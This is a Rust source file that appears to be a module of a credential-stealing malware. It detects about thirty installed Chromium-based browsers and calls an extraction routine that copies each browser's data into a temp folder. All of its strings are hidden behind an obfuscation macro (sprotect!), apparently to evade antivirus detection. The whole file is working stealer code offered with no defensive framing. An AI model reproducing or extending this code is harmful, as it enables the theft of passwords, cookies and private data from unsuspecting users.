use crate::sprotect;
use super::lextract;
use std::collections::HashMap;

pub async fn collect() -> Result<(), ()> {
    let browsers = get_legacy_browsers();
    let mut found_browsers = Vec::new();

    for (name, (app_name, author)) in &browsers {
        if lextract::browser_exists(app_name, author) {
            found_browsers.push((name.clone(), app_name.clone(), author.clone()));
        }
    }

    if found_browsers.is_empty() {
        return Ok(());
    }

    std::fs::create_dir_all(sprotect!("C:\\temp\\extract\\legacy")).ok();
    
    #[cfg(windows)]
    {
        use std::os::windows::process::CommandExt;
    }

    for (browser_name, app_name, author) in found_browsers {
        let output_dir = format!("{}\\{}", sprotect!("C:\\temp\\extract\\legacy"), browser_name);
        std::fs::create_dir_all(&output_dir).ok();
        
        lextract::extract_browser_data(&app_name, &author, &output_dir).await.ok();
    }

    Ok(())
}

fn get_legacy_browsers() -> HashMap<String, (String, String)> {
    let mut browsers = HashMap::new();
    
    browsers.insert(sprotect!("edge").to_string(), (sprotect!("Edge").to_string(), sprotect!("Microsoft").to_string()));
    browsers.insert(sprotect!("chromium").to_string(), (sprotect!("").to_string(), sprotect!("Chromium").to_string()));
    browsers.insert(sprotect!("7star").to_string(), (sprotect!("7Star").to_string(), sprotect!("7Star").to_string()));
    browsers.insert(sprotect!("amigo").to_string(), (sprotect!("").to_string(), sprotect!("Amigo").to_string()));
    browsers.insert(sprotect!("brave").to_string(), (sprotect!("Brave-Browser").to_string(), sprotect!("BraveSoftware").to_string()));
    browsers.insert(sprotect!("centbrowser").to_string(), (sprotect!("").to_string(), sprotect!("CentBrowser").to_string()));
    browsers.insert(sprotect!("chedot").to_string(), (sprotect!("").to_string(), sprotect!("Chedot").to_string()));
    browsers.insert(sprotect!("chrome_canary").to_string(), (sprotect!("Chrome SxS").to_string(), sprotect!("Google").to_string()));
    browsers.insert(sprotect!("coccoc").to_string(), (sprotect!("Browser").to_string(), sprotect!("CocCoc").to_string()));
    browsers.insert(sprotect!("dragon").to_string(), (sprotect!("Dragon").to_string(), sprotect!("Comodo").to_string()));
    browsers.insert(sprotect!("elements-browser").to_string(), (sprotect!("").to_string(), sprotect!("Elements Browser").to_string()));
    browsers.insert(sprotect!("epic-privacy-browser").to_string(), (sprotect!("").to_string(), sprotect!("Epic Privacy Browser").to_string()));
    browsers.insert(sprotect!("chrome").to_string(), (sprotect!("Chrome").to_string(), sprotect!("Google").to_string()));
    browsers.insert(sprotect!("kometa").to_string(), (sprotect!("").to_string(), sprotect!("Kometa").to_string()));
    browsers.insert(sprotect!("orbitum").to_string(), (sprotect!("").to_string(), sprotect!("Orbitum").to_string()));
    browsers.insert(sprotect!("sputnik").to_string(), (sprotect!("Sputnik").to_string(), sprotect!("Sputnik").to_string()));
    browsers.insert(sprotect!("torch").to_string(), (sprotect!("").to_string(), sprotect!("Torch").to_string()));
    browsers.insert(sprotect!("ucozmedia").to_string(), (sprotect!("Uran").to_string(), sprotect!("uCozMedia").to_string()));
    browsers.insert(sprotect!("vivaldi").to_string(), (sprotect!("").to_string(), sprotect!("Vivaldi").to_string()));
    browsers.insert(sprotect!("atom-mailru").to_string(), (sprotect!("Atom").to_string(), sprotect!("Mail.Ru").to_string()));
    browsers.insert(sprotect!("opera").to_string(), (sprotect!("Opera Software").to_string(), sprotect!("Opera Stable").to_string()));
    browsers.insert(sprotect!("opera-gx").to_string(), (sprotect!("Opera Software").to_string(), sprotect!("Opera GX Stable").to_string()));
    browsers.insert(sprotect!("chromeplus").to_string(), (sprotect!("MappleStudio").to_string(), sprotect!("ChromePlus").to_string()));
    browsers.insert(sprotect!("iridium").to_string(), (sprotect!("Iridium").to_string(), sprotect!("Iridium").to_string()));
    browsers.insert(sprotect!("sleipnir").to_string(), (sprotect!("sleipnir5").to_string(), sprotect!("settings").to_string()));
    browsers.insert(sprotect!("citrio").to_string(), (sprotect!("CatalinaGroup").to_string(), sprotect!("Citrio").to_string()));
    browsers.insert(sprotect!("coowoo").to_string(), (sprotect!("").to_string(), sprotect!("Coowoo").to_string()));
    browsers.insert(sprotect!("liebao").to_string(), (sprotect!("").to_string(), sprotect!("liebao").to_string()));
    browsers.insert(sprotect!("qip-surf").to_string(), (sprotect!("").to_string(), sprotect!("Qip Surf").to_string()));
    browsers.insert(sprotect!("360browser").to_string(), (sprotect!("360Browser").to_string(), sprotect!("Browser").to_string()));

    browsers
}